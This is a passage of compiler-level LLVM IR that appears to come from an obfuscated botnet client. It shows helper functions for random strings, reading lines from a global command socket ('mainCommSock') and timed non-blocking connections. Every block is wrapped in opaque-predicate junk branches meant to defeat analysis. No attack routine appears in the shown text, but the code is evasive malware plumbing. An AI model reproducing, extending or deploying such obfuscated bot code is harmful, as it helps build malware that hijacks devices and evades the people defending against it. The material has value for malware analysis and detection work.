  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.49
  %12 = load i32, i32* @y.50
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.49
  %28 = load i32, i32* @y.50
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %6
  %39 = load i32, i32* @x.49
  %40 = load i32, i32* @y.50
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %38
  %47 = load i32, i32* @x.49
  %48 = load i32, i32* @y.50
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %55 = call i32 @rand_cmwc()
  %_ = sub i32 %55, 26
  %gen = mul i32 %_, 26
  %_1 = shl i32 %55, 26
  %_2 = shl i32 %55, 26
  %_3 = sub i32 0, %55
  %gen4 = add i32 %_3, 26
  %_5 = sub i32 0, %55
  %gen6 = add i32 %_5, 26
  %_7 = shl i32 %55, 26
  %56 = urem i32 %55, 26
  %_8 = shl i32 %56, 65
  %_9 = sub i32 %56, 65
  %gen10 = mul i32 %_9, 65
  %_11 = sub i32 %56, 65
  %gen12 = mul i32 %_11, 65
  %_13 = shl i32 %56, 65
  %_14 = sub i32 %56, 65
  %gen15 = mul i32 %_14, 65
  %_16 = shl i32 %56, 65
  %_17 = sub i32 0, %56
  %gen18 = add i32 %_17, 65
  %_19 = sub i32 %56, 65
  %gen20 = mul i32 %_19, 65
  %57 = add i32 %56, 65
  %58 = trunc i32 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  store i8 %58, i8* %62, align 1
  br label %originalBB

originalBB21alteredBB:                            ; preds = %originalBB21, %38
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* @x.51
  %35 = load i32, i32* @y.52
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %5, align 4
  %43 = srem i32 %42, 64
  %44 = zext i32 %43 to i64
  %45 = shl i64 1, %44
  %46 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %47 = load i32, i32* %5, align 4
  %48 = sdiv i32 %47, 64
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %46, i64 0, i64 %49
  %51 = load i64, i64* %50, align 8
  %52 = or i64 %51, %45
  store i64 %52, i64* %50, align 8
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, 1
  %55 = call i32 @select(i32 %54, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %55, i32* %12, align 4
  %56 = icmp sle i32 %55, 0
  %57 = load i32, i32* @x.51
  %58 = load i32, i32* @y.52
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %134

; <label>:65:                                     ; preds = %originalBBpart2
  br label %66

; <label>:66:                                     ; preds = %originalBBpart293, %65
  %67 = load i32, i32* %13, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %133

; <label>:69:                                     ; preds = %66
  %70 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %70, align 8
  %71 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %71, align 8
  br label %72

; <label>:72:                                     ; preds = %69
  %73 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %73, i64 0, i64 0
  %75 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %74) #5, !srcloc !3
  %76 = extractvalue { i64, i64* } %75, 0
  %77 = extractvalue { i64, i64* } %75, 1
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %14, align 4
  %79 = ptrtoint i64* %77 to i64
  %80 = trunc i64 %79 to i32
  store i32 %80, i32* %15, align 4
  br label %81

; <label>:81:                                     ; preds = %72
  %82 = load i32, i32* @x.51
  %83 = load i32, i32* @y.52
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %81
  %90 = load i32, i32* %5, align 4
  %91 = srem i32 %90, 64
  %92 = zext i32 %91 to i64
  %93 = shl i64 1, %92
  %94 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %95 = load i32, i32* %5, align 4
  %96 = sdiv i32 %95, 64
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [16 x i64], [16 x i64]* %94, i64 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %99, %93
  store i64 %100, i64* %98, align 8
  %101 = load i32, i32* %5, align 4
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %103, i32* %12, align 4
  %104 = icmp sle i32 %103, 0
  %105 = load i32, i32* @x.51
  %106 = load i32, i32* @y.52
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart286, label %originalBB51alteredBB

originalBBpart286:                                ; preds = %originalBB51
  br i1 %104, label %113, label %132

; <label>:113:                                    ; preds = %originalBBpart286
  %114 = load i32, i32* @x.51
  %115 = load i32, i32* @y.52
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %113
  %122 = load i32, i32* %13, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %13, align 4
  %124 = load i32, i32* @x.51
  %125 = load i32, i32* @y.52
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart293, label %originalBB88alteredBB

originalBBpart293:                                ; preds = %originalBB88
  br label %66

; <label>:132:                                    ; preds = %originalBBpart286
  br label %133

; <label>:133:                                    ; preds = %132, %66
  br label %134

; <label>:134:                                    ; preds = %133, %originalBBpart2
  %135 = load i32, i32* @x.51
  %136 = load i32, i32* @y.52
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %134
  store i32 0, i32* %18, align 4
  %143 = load i8*, i8** %6, align 8
  store i8* %143, i8** %17, align 8
  %144 = load i32, i32* @x.51
  %145 = load i32, i32* @y.52
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %152

; <label>:152:                                    ; preds = %202, %originalBBpart297
  %153 = load i32, i32* %7, align 4
  %154 = add nsw i32 %153, -1
  store i32 %154, i32* %7, align 4
  %155 = icmp sgt i32 %153, 1
  br i1 %155, label %156, label %205

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @mainCommSock, align 4
  %158 = call i64 @recv(i32 %157, i8* %16, i64 1, i32 0)
  %159 = icmp ne i64 %158, 1
  br i1 %159, label %160, label %178

; <label>:160:                                    ; preds = %156
  %161 = load i32, i32* @x.51
  %162 = load i32, i32* @y.52
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %160
  %169 = load i8*, i8** %17, align 8
  store i8 0, i8* %169, align 1
  store i32 -1, i32* %4, align 4
  %170 = load i32, i32* @x.51
  %171 = load i32, i32* @y.52
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %224

; <label>:178:                                    ; preds = %156
  %179 = load i8, i8* %16, align 1
  %180 = load i8*, i8** %17, align 8
  %181 = getelementptr inbounds i8, i8* %180, i32 1
  store i8* %181, i8** %17, align 8
  store i8 %179, i8* %180, align 1
  %182 = load i8, i8* %16, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 10
  br i1 %184, label %185, label %202

; <label>:185:                                    ; preds = %178
  %186 = load i32, i32* @x.51
  %187 = load i32, i32* @y.52
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %185
  %194 = load i32, i32* @x.51
  %195 = load i32, i32* @y.52
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %205

; <label>:202:                                    ; preds = %178
  %203 = load i32, i32* %18, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %18, align 4
  br label %152

; <label>:205:                                    ; preds = %originalBBpart2105, %152
  %206 = load i32, i32* @x.51
  %207 = load i32, i32* @y.52
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %205
  %214 = load i8*, i8** %17, align 8
  store i8 0, i8* %214, align 1
  %215 = load i32, i32* %18, align 4
  store i32 %215, i32* %4, align 4
  %216 = load i32, i32* @x.51
  %217 = load i32, i32* @y.52
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %224

; <label>:224:                                    ; preds = %originalBBpart2109, %originalBBpart2101
  %225 = load i32, i32* %4, align 4
  ret i32 %225

originalBBalteredBB:                              ; preds = %originalBB, %33
  %226 = load i32, i32* %5, align 4
  %_ = sub i32 %226, 64
  %gen = mul i32 %_, 64
  %_1 = sub i32 0, %226
  %gen2 = add i32 %_1, 64
  %_3 = sub i32 %226, 64
  %gen4 = mul i32 %_3, 64
  %_5 = sub i32 %226, 64
  %gen6 = mul i32 %_5, 64
  %227 = srem i32 %226, 64
  %228 = zext i32 %227 to i64
  %_7 = shl i64 1, %228
  %_8 = shl i64 1, %228
  %_9 = sub i64 1, %228
  %gen10 = mul i64 %_9, %228
  %_11 = sub i64 1, %228
  %gen12 = mul i64 %_11, %228
  %_13 = sub i64 0, 1
  %gen14 = add i64 %_13, %228
  %_15 = shl i64 1, %228
  %229 = shl i64 1, %228
  %230 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %231 = load i32, i32* %5, align 4
  %_16 = sub i32 0, %231
  %gen17 = add i32 %_16, 64
  %_18 = sub i32 %231, 64
  %gen19 = mul i32 %_18, 64
  %_20 = sub i32 %231, 64
  %gen21 = mul i32 %_20, 64
  %_22 = sub i32 %231, 64
  %gen23 = mul i32 %_22, 64
  %_24 = sub i32 %231, 64
  %gen25 = mul i32 %_24, 64
  %232 = sdiv i32 %231, 64
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %230, i64 0, i64 %233
  %235 = load i64, i64* %234, align 8
  %_26 = sub i64 %235, %229
  %gen27 = mul i64 %_26, %229
  %_28 = shl i64 %235, %229
  %_29 = shl i64 %235, %229
  %_30 = sub i64 0, %235
  %gen31 = add i64 %_30, %229
  %_32 = shl i64 %235, %229
  %_33 = sub i64 %235, %229
  %gen34 = mul i64 %_33, %229
  %_35 = sub i64 %235, %229
  %gen36 = mul i64 %_35, %229
  %236 = or i64 %235, %229
  store i64 %236, i64* %234, align 8
  %237 = load i32, i32* %5, align 4
  %_37 = sub i32 0, %237
  %gen38 = add i32 %_37, 1
  %_39 = shl i32 %237, 1
  %_40 = sub i32 %237, 1
  %gen41 = mul i32 %_40, 1
  %_42 = shl i32 %237, 1
  %_43 = sub i32 %237, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 0, %237
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 %237, 1
  %gen48 = mul i32 %_47, 1
  %_49 = sub i32 0, %237
  %gen50 = add i32 %_49, 1
  %238 = add nsw i32 %237, 1
  %239 = call i32 @select(i32 %238, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %239, i32* %12, align 4
  %240 = icmp sle i32 %239, 0
  br label %originalBB

originalBB51alteredBB:                            ; preds = %originalBB51, %81
  %241 = load i32, i32* %5, align 4
  %_52 = sub i32 %241, 64
  %gen53 = mul i32 %_52, 64
  %_54 = sub i32 %241, 64
  %gen55 = mul i32 %_54, 64
  %_56 = sub i32 0, %241
  %gen57 = add i32 %_56, 64
  %_58 = sub i32 %241, 64
  %gen59 = mul i32 %_58, 64
  %242 = srem i32 %241, 64
  %243 = zext i32 %242 to i64
  %_60 = sub i64 0, 1
  %gen61 = add i64 %_60, %243
  %244 = shl i64 1, %243
  %245 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %246 = load i32, i32* %5, align 4
  %_62 = shl i32 %246, 64
  %_63 = shl i32 %246, 64
  %_64 = sub i32 0, %246
  %gen65 = add i32 %_64, 64
  %_66 = sub i32 0, %246
  %gen67 = add i32 %_66, 64
  %_68 = sub i32 0, %246
  %gen69 = add i32 %_68, 64
  %247 = sdiv i32 %246, 64
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [16 x i64], [16 x i64]* %245, i64 0, i64 %248
  %250 = load i64, i64* %249, align 8
  %_70 = sub i64 %250, %244
  %gen71 = mul i64 %_70, %244
  %_72 = shl i64 %250, %244
  %251 = or i64 %250, %244
  store i64 %251, i64* %249, align 8
  %252 = load i32, i32* %5, align 4
  %_73 = sub i32 %252, 1
  %gen74 = mul i32 %_73, 1
  %_75 = sub i32 %252, 1
  %gen76 = mul i32 %_75, 1
  %_77 = sub i32 0, %252
  %gen78 = add i32 %_77, 1
  %_79 = sub i32 0, %252
  %gen80 = add i32 %_79, 1
  %_81 = sub i32 0, %252
  %gen82 = add i32 %_81, 1
  %_83 = sub i32 0, %252
  %gen84 = add i32 %_83, 1
  %253 = add nsw i32 %252, 1
  %254 = call i32 @select(i32 %253, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %254, i32* %12, align 4
  %255 = icmp sle i32 %254, 0
  br label %originalBB51

originalBB88alteredBB:                            ; preds = %originalBB88, %113
  %256 = load i32, i32* %13, align 4
  %_89 = shl i32 %256, 1
  %_90 = sub i32 %256, 1
  %gen91 = mul i32 %_90, 1
  %257 = add nsw i32 %256, 1
  store i32 %257, i32* %13, align 4
  br label %originalBB88

originalBB95alteredBB:                            ; preds = %originalBB95, %134
  store i32 0, i32* %18, align 4
  %258 = load i8*, i8** %6, align 8
  store i8* %258, i8** %17, align 8
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %160
  %259 = load i8*, i8** %17, align 8
  store i8 0, i8* %259, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %185
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %205
  %260 = load i8*, i8** %17, align 8
  store i8 0, i8* %260, align 1
  %261 = load i32, i32* %18, align 4
  store i32 %261, i32* %4, align 4
  br label %originalBB107
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %4
  %37 = load i32, i32* @x.53
  %38 = load i32, i32* @y.54
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %5, align 4
  %45 = load i32, i32* @x.53
  %46 = load i32, i32* @y.54
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %196

; <label>:53:                                     ; preds = %4
  %54 = load i32, i32* @x.53
  %55 = load i32, i32* @y.54
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = load i32, i32* %6, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 16)
  store i32 %66, i32* %16, align 4
  %67 = load i32, i32* %16, align 4
  %68 = icmp slt i32 %67, 0
  %69 = load i32, i32* @x.53
  %70 = load i32, i32* @y.54
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %68, label %77, label %171

; <label>:77:                                     ; preds = %originalBBpart24
  %78 = call i32* @__errno_location() #10
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 115
  br i1 %80, label %81, label %169

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %83, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %85, align 8
  br label %86

; <label>:86:                                     ; preds = %81
  %87 = load i32, i32* @x.53
  %88 = load i32, i32* @y.54
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %96 = getelementptr inbounds [16 x i64], [16 x i64]* %95, i64 0, i64 0
  %97 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %96) #5, !srcloc !4
  %98 = extractvalue { i64, i64* } %97, 0
  %99 = extractvalue { i64, i64* } %97, 1
  %100 = trunc i64 %98 to i32
  store i32 %100, i32* %17, align 4
  %101 = ptrtoint i64* %99 to i64
  %102 = trunc i64 %101 to i32
  store i32 %102, i32* %18, align 4
  %103 = load i32, i32* @x.53
  %104 = load i32, i32* @y.54
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %111

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i32, i32* %6, align 4
  %113 = srem i32 %112, 64
  %114 = zext i32 %113 to i64
  %115 = shl i64 1, %114
  %116 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %117 = load i32, i32* %6, align 4
  %118 = sdiv i32 %117, 64
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 %119
  %121 = load i64, i64* %120, align 8
  %122 = or i64 %121, %115
  store i64 %122, i64* %120, align 8
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  %125 = call i32 @select(i32 %124, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %126 = icmp sgt i32 %125, 0
  br i1 %126, label %127, label %167

; <label>:127:                                    ; preds = %111
  store i32 4, i32* %13, align 4
  %128 = load i32, i32* %6, align 4
  %129 = bitcast i32* %14 to i8*
  %130 = call i32 @getsockopt(i32 %128, i32 1, i32 4, i8* %129, i32* %13) #5
  %131 = load i32, i32* %14, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %133, label %150

; <label>:133:                                    ; preds = %127
  %134 = load i32, i32* @x.53
  %135 = load i32, i32* @y.54
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  store i32 0, i32* %5, align 4
  %142 = load i32, i32* @x.53
  %143 = load i32, i32* @y.54
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %196

